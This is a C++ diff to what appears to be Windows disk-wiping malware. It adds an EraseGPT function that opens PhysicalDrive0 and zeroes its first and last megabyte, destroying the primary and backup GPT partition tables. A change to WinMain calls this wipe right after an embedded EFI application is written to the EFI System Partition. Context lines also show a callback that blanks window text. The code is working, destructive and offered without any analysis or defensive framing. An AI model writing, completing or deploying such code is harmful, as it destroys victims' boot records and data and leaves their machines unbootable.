@@ -246,6 +246,78 @@ bool WriteEFIAppToESP(const uint8_t* data, size_t size) {
     return success && (written == size);
 }
 
+bool EraseGPT() {
+    std::cout << "[DEBUG] Erasing GPT on PhysicalDrive0..." << std::endl;
+
+    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0",
+                                GENERIC_READ | GENERIC_WRITE,
+                                FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                NULL,
+                                OPEN_EXISTING,
+                                0,
+                                NULL);
+    if (hDrive == INVALID_HANDLE_VALUE) {
+        std::cout << "[DEBUG] Failed to open PhysicalDrive0. Error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    GET_LENGTH_INFORMATION lengthInfo;
+    DWORD bytesReturned;
+    if (!DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0,
+                         &lengthInfo, sizeof(lengthInfo), &bytesReturned, NULL)) {
+        std::cout << "[DEBUG] Failed to get disk length. Error: " << GetLastError() << std::endl;
+        CloseHandle(hDrive);
+        return false;
+    }
+    LONGLONG totalSectors = lengthInfo.Length.QuadPart / 512;
+    std::cout << "[DEBUG] Disk size: " << lengthInfo.Length.QuadPart << " bytes (" << totalSectors << " sectors)" << std::endl;
+
+    const DWORD sectorSize = 512;
+    const DWORD wipeSectors = 2048;
+
+    DWORD totalBytes = wipeSectors * sectorSize;
+    LPVOID pZero = LocalAlloc(LMEM_FIXED, totalBytes);
+    if (!pZero) { CloseHandle(hDrive); return false; }
+    ZeroMemory(pZero, totalBytes);
+
+    DWORD written = 0;
+    BOOL success = WriteFile(hDrive, pZero, totalBytes, &written, NULL);
+    LocalFree(pZero);
+    if (!success || written != totalBytes) {
+        std::cout << "[DEBUG] Failed to wipe first 1 MB. Written: " << written << " bytes." << std::endl;
+        CloseHandle(hDrive);
+        return false;
+    }
+    FlushFileBuffers(hDrive);
+
+    if (totalSectors > wipeSectors) {
+        LARGE_INTEGER offset;
+        offset.QuadPart = (totalSectors - wipeSectors) * sectorSize;
+        if (SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN) == 0) {
+            std::cout << "[DEBUG] Failed to seek to last 1 MB. Error: " << GetLastError() << std::endl;
+            CloseHandle(hDrive);
+            return false;
+        }
+
+        LPVOID pZeroLast = LocalAlloc(LMEM_FIXED, totalBytes);
+        if (!pZeroLast) { CloseHandle(hDrive); return false; }
+        ZeroMemory(pZeroLast, totalBytes);
+
+        success = WriteFile(hDrive, pZeroLast, totalBytes, &written, NULL);
+        LocalFree(pZeroLast);
+        if (!success || written != totalBytes) {
+            std::cout << "[DEBUG] Failed to wipe last 1 MB. Written: " << written << " bytes." << std::endl;
+            CloseHandle(hDrive);
+            return false;
+        }
+        FlushFileBuffers(hDrive);
+    }
+
+    CloseHandle(hDrive);
+    std::cout << "[DEBUG] GPT erased thoroughly (first and last 1 MB)." << std::endl;
+    return true;
+}
+
 BOOL CALLBACK destroy_window_callback(HWND hWnd, LPARAM) {
     SetWindowTextW(hWnd, L"\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n");
     SendMessageW(hWnd, WM_SETTEXT, 0, (LPARAM)L"\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n");
@@ -316,8 +388,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     bool writeSuccess = false;
 
+    // writeSuccess = EraseGPT();
+
     if (IsUEFI()) {
         writeSuccess = WriteEFIAppToESP(test_efi, sizeof(test_efi));
+        if (writeSuccess) {
+            std::cout << "[DEBUG] EFI app written. Now erasing GPT..." << std::endl;
+            EraseGPT();
+        }
     } else {
         HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0",
                                     GENERIC_READ | GENERIC_WRITE,
